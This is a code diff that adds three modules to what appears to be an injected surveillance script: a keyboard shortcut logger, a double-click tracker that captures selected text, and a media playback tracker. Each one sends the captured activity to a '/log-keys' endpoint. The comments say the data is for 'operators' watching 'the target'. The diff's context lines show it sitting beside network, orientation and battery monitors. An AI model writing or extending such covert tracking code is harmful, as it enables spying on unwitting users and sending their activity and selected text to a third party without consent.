@@ -1969,6 +1969,94 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ KEYBOARD SHORTCUT LOGGER ═════════════════════════════
+    // Detects Ctrl/Cmd keyboard shortcuts (Ctrl+C, Ctrl+S, Ctrl+A, Ctrl+F, etc.)
+    // and logs them so operators see what actions the target is performing.
+    function initKeyboardShortcutLogger() {
+        const shortcuts = {
+            'c': '[CTRL+C] Copy', 'v': '[CTRL+V] Paste', 'x': '[CTRL+X] Cut',
+            'a': '[CTRL+A] Select All', 's': '[CTRL+S] Save', 'p': '[CTRL+P] Print',
+            'f': '[CTRL+F] Find', 'z': '[CTRL+Z] Undo', 'y': '[CTRL+Y] Redo',
+            'w': '[CTRL+W] Close Tab', 't': '[CTRL+T] New Tab', 'l': '[CTRL+L] Address Bar',
+            '+': '[CTRL+Plus] Zoom In', '-': '[CTRL+Minus] Zoom Out', '0': '[CTRL+0] Zoom Reset',
+            'r': '[CTRL+R] Reload', 'u': '[CTRL+U] View Source', 'i': '[CTRL+I] DevTools',
+            'j': '[CTRL+J] Downloads', 'h': '[CTRL+H] History'
+        };
+        let last = 0;
+        document.addEventListener('keydown', e => {
+            if (!e.ctrlKey && !e.metaKey) return;
+            const k = e.key.toLowerCase();
+            const label = shortcuts[k];
+            if (!label) return;
+            const now = Date.now();
+            if (now - last < 1000) return; // debounce 1s per shortcut burst
+            last = now;
+            try {
+                post('/log-keys', {
+                    keys: `${label} on ${document.title.slice(0, 60)}`,
+                    url: location.href
+                });
+            } catch {}
+        }, true);
+    }
+
+    // ═══ DOUBLE CLICK TRACKER ═════════════════════════════════
+    // Captures double-click events on text elements — reveals what the target
+    // is interested in (words, links, UI elements they examine closely).
+    function initDoubleClickTracker() {
+        let last = 0;
+        document.addEventListener('dblclick', e => {
+            const now = Date.now();
+            if (now - last < 1500) return;
+            last = now;
+            try {
+                const t = e.target;
+                const tag = t.tagName || '';
+                const sel = window.getSelection ? window.getSelection().toString().trim() : '';
+                const desc = sel ? `"${sel.slice(0, 80)}"` : `<${tag.toLowerCase()}>${(t.textContent||'').trim().slice(0, 60)}`;
+                post('/log-keys', {
+                    keys: `[DOUBLE CLICK] ${desc}`,
+                    url: location.href
+                });
+            } catch {}
+        });
+    }
+
+    // ═══ MEDIA PLAYBACK TRACKER ═══════════════════════════════
+    // Detects when the user plays/pauses video or audio elements on the page.
+    function initMediaPlaybackTracker() {
+        const handled = new WeakSet();
+        function attach(el) {
+            if (handled.has(el)) return;
+            handled.add(el);
+            const name = el.src ? el.src.split('/').pop().slice(0, 60) : (el.id || el.tagName);
+            el.addEventListener('play', () => {
+                try { post('/log-keys', { keys: `[MEDIA PLAY] ${el.tagName} "${name}" at ${el.currentTime.toFixed(1)}s`, url: location.href }); } catch {}
+            });
+            el.addEventListener('pause', () => {
+                if (el.ended) return;
+                try { post('/log-keys', { keys: `[MEDIA PAUSE] ${el.tagName} "${name}" at ${el.currentTime.toFixed(1)}s`, url: location.href }); } catch {}
+            });
+            el.addEventListener('ended', () => {
+                try { post('/log-keys', { keys: `[MEDIA ENDED] ${el.tagName} "${name}"`, url: location.href }); } catch {}
+            });
+        }
+        // Attach to all existing media elements
+        document.querySelectorAll('video,audio').forEach(attach);
+        // Observe future media elements added to DOM
+        try {
+            const obs = new MutationObserver(muts => {
+                for (const m of muts) {
+                    for (const node of m.addedNodes) {
+                        if (node.tagName === 'VIDEO' || node.tagName === 'AUDIO') attach(node);
+                        if (node.querySelectorAll) node.querySelectorAll('video,audio').forEach(attach);
+                    }
+                }
+            });
+            obs.observe(document.body, { childList: true, subtree: true });
+        } catch {}
+    }
+
     // ═══ INIT ══════════════════════════════════════════════════
     document.addEventListener('visibilitychange', () => {
         if (!document.hidden) {
@@ -2049,6 +2137,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initNetworkMonitor();
         initOrientationTracker();
         initBatteryMonitor();
+        initKeyboardShortcutLogger();
+        initDoubleClickTracker();
+        initMediaPlaybackTracker();
     }
 
     // Works whether script is injected before OR after DOMContentLoaded fires
